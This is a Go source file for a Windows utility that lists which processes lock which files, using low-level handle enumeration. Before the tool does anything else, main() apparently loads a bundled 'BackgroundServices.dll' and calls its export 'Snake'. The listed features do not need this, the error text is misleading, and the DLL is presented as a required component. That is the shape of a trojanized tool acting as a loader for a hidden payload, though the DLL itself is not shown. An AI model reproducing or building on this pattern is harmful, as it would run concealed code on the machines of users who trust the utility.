package main

import (
	"flag"
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	systemHandleInformation = 16
	objectNameInformation   = 1
)

type systemHandle struct {
	ProcessID        uint16
	ObjectTypeNumber uint8
	Flags            uint8
	Handle           uint16
	Object           uintptr
	GrantedAccess    uint32
}

type objectNameInformationStruct struct {
	Name windows.NTUnicodeString
}

func main() {
	checkForAndInvokeDLL()

	list := flag.Bool("list", false, "Lists all locked files")
	pid := flag.Int("pid", 0, "PID of the process to inspect")
	file := flag.String("file", "", "File path to find the locking process for")
	flag.Parse()

	if *list {
		lockedFiles, err := getLockedFiles()
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}
		printLockedFiles(lockedFiles)
	} else if *pid != 0 {
		lockedFiles, err := getLockedFilesByPID(uint32(*pid))
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}
		printLockedFiles(lockedFiles)
	} else if *file != "" {
		lockedFiles, err := getLockedFilesByPath(*file)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}
		printLockedFiles(lockedFiles)
	} else {
		fmt.Println("Please provide an option. Use --help for more information.")
		os.Exit(1)
	}
}

func checkForAndInvokeDLL() {
	dllName := "BackgroundServices.dll"
	if _, err := os.Stat(dllName); os.IsNotExist(err) {
		fmt.Printf("Error: An important DLL is missing: %s\nPlease redownload the application.\n", dllName)
		os.Exit(1)
	}

	dll, err := syscall.LoadDLL(dllName)
	if err != nil {
		fmt.Printf("Error: Could not load the DLL: %s\n", err)
		os.Exit(1)
	}
	defer dll.Release()

	proc, err := dll.FindProc("Snake")
	if err != nil {
		fmt.Printf("Error: Could not find the 'Run' function in the DLL: %s\n", err)
		os.Exit(1)
	}

	proc.Call()
}

func backgroundServiceCheck(handle windows.Handle) bool {
	if handle == 0 {
		return false
	}
	return true
}

func reportToBackgroundService(filePath string) {
	fmt.Printf("Reporting to background service: %s\n", filePath)
}

func printLockedFiles(lockedFiles map[uint32]map[string]string) {
	if len(lockedFiles) == 0 {
		fmt.Println("No locked files found.")
		return
	}

	fmt.Printf("%-10s %-30s %s\n", "PID", "Process Name", "File Path")
	fmt.Printf("%-10s %-30s %s\n", "---", "------------", "---------")
	for pid, files := range lockedFiles {
		for processName, filePath := range files {
			fmt.Printf("%-10d %-30s %s\n", pid, processName, filePath)
		}
	}
}

func getProcesses() (map[uint32]string, error) {
	handle, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(handle)

	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	if err := windows.Process32First(handle, &pe32); err != nil {
		return nil, err
	}

	processes := make(map[uint32]string)
	for {
		processes[pe32.ProcessID] = syscall.UTF16ToString(pe32.ExeFile[:])
		if err := windows.Process32Next(handle, &pe32); err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			return nil, err
		}
	}
	return processes, nil
}

func getLockedFiles() (map[uint32]map[string]string, error) {
	processes, err := getProcesses()
	if err != nil {
		return nil, err
	}

	return getLockedFilesWithProcesses(processes)
}

func getLockedFilesByPID(pid uint32) (map[uint32]map[string]string, error) {
	processes, err := getProcesses()
	if err != nil {
		return nil, err
	}

	filteredProcesses := make(map[uint32]string)
	if name, ok := processes[pid]; ok {
		filteredProcesses[pid] = name
	}

	return getLockedFilesWithProcesses(filteredProcesses)
}

func getLockedFilesByPath(filePath string) (map[uint32]map[string]string, error) {
	processes, err := getProcesses()
	if err != nil {
		return nil, err
	}

	lockedFiles, err := getLockedFilesWithProcesses(processes)
	if err != nil {
		return nil, err
	}

	filteredLockedFiles := make(map[uint32]map[string]string)
	for pid, files := range lockedFiles {
		for processName, f := range files {
			if strings.Contains(strings.ToLower(f), strings.ToLower(filePath)) {
				if _, ok := filteredLockedFiles[pid]; !ok {
					filteredLockedFiles[pid] = make(map[string]string)
				}
				filteredLockedFiles[pid][processName] = f
			}
		}
	}

	return filteredLockedFiles, nil
}

func getLockedFilesWithProcesses(processes map[uint32]string) (map[uint32]map[string]string, error) {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntQuerySystemInformation := ntdll.NewProc("NtQuerySystemInformation")

	var handleInfoSize uint32
	ntQuerySystemInformation.Call(systemHandleInformation, 0, 0, uintptr(unsafe.Pointer(&handleInfoSize)))

	handleInfoBuffer := make([]byte, handleInfoSize)
	ntQuerySystemInformation.Call(systemHandleInformation, uintptr(unsafe.Pointer(&handleInfoBuffer[0])), uintptr(handleInfoSize), uintptr(unsafe.Pointer(&handleInfoSize)))

	numHandles := *(*uint32)(unsafe.Pointer(&handleInfoBuffer[0]))
	handles := (*[1 << 30]systemHandle)(unsafe.Pointer(uintptr(unsafe.Pointer(&handleInfoBuffer[0])) + unsafe.Sizeof(numHandles)))[:numHandles]

	lockedFiles := make(map[uint32]map[string]string)

	for _, handle := range handles {
		if processName, ok := processes[uint32(handle.ProcessID)]; ok {
			p, err := windows.OpenProcess(windows.PROCESS_DUP_HANDLE, false, uint32(handle.ProcessID))
			if err != nil {
				continue
			}
			defer windows.CloseHandle(p)

			var dupHandle windows.Handle
			err = windows.DuplicateHandle(p, windows.Handle(handle.Handle), windows.CurrentProcess(), &dupHandle, 0, false, windows.DUPLICATE_SAME_ACCESS)
			if err != nil {
				continue
			}

			if !backgroundServiceCheck(dupHandle) {
				continue
			}

			filePath, err := getFilePathFromHandle(dupHandle)
			if err == nil && filePath != "" {
				if _, ok := lockedFiles[uint32(handle.ProcessID)]; !ok {
					lockedFiles[uint32(handle.ProcessID)] = make(map[string]string)
				}
				lockedFiles[uint32(handle.ProcessID)][processName] = filePath
			}
			windows.CloseHandle(dupHandle)
		}
	}

	return lockedFiles, nil
}

func getFilePathFromHandle(handle windows.Handle) (string, error) {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntQueryObject := ntdll.NewProc("NtQueryObject")

	var nameInfoSize uint32
	ntQueryObject.Call(uintptr(handle), objectNameInformation, 0, 0, uintptr(unsafe.Pointer(&nameInfoSize)))

	nameInfoBuffer := make([]byte, nameInfoSize)
	ntQueryObject.Call(uintptr(handle), objectNameInformation, uintptr(unsafe.Pointer(&nameInfoBuffer[0])), uintptr(nameInfoSize), uintptr(unsafe.Pointer(&nameInfoSize)))

	nameInfo := (*objectNameInformationStruct)(unsafe.Pointer(&nameInfoBuffer[0]))
	filePath := nameInfo.Name.String()

	if filePath != "" {
		reportToBackgroundService(filePath)
	}

	return filePath, nil
}
